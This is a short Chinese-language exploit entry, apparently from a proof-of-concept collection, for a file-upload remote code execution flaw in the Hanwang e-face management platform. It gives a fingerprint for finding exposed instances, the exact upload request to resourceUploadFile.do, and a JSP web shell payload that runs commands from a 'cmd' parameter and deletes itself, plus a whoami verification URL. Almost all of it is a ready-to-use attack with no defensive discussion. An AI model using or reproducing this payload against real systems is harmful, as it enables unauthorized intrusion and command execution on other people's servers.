# 汉王e脸通综合管理平台resourceUploadFile.do存在文件上传致RCE

- **系统**：汉王e脸通综合管理平台　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`icon_hash="1380907357"`
- **请求**：`POST /manage/dgmCommand/resourceUploadFile.do?recoToken=ZuZBOrvLG8M HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlA…`

**请求体 / payload**
```
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: image/jpeg
<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
验证路径
/manage/resource/0c89e62357fc4a92a241e938cd52dfa0.jsp?cmd=whoami
:---
```
- **预期**：200　|　—